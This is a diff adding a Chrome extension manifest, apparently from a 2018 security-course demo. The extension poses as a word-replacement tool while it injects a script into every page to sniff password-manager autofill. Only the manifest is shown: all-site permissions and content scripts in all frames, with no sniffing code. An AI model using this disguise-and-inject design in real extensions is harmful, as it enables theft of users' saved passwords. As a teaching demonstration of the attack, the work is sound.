@@ -1,0 +1,41 @@
+/***************************************
+ *
+ *      manifest.json
+ *      by Gregory Pickart
+ *      May 3, 2018
+ *
+ *      Chrome extension manifest file for Comp116 Final Project demo. 
+ *      The extension disguises itself as a silly word replacement extension
+ *      while in the background sniffing for password manager autofill actions.
+ * 
+ ***************************************/
+
+{
+  "name": "Comp116 Final Project Supplement",
+  "version": "1.0",
+  "manifest_version": 2,
+  "description": "Injects a password manager autofill sniffing script into every webpage. Disguises itself as a word replacement extension. Purely for demonstration purposes for Comp116 Final Project",
+  "homepage_url": "https://gregpickart.xyz/security.html",
+  "background": {
+    "scripts": [
+      "background.js"
+    ],
+    "persistent": true
+  },
+  "browser_action": {
+    "default_title": "Autofill Sniffing Injection"
+  },
+  "permissions": [
+    "https://*/*",
+    "http://*/*",
+    "tabs"
+  ],
+  "content_scripts":
+  [
+    {
+      "matches": ["*://*/*"],
+      "js": ["content_script.js"],
+      "all_frames": true
+    }
+  ]
+}
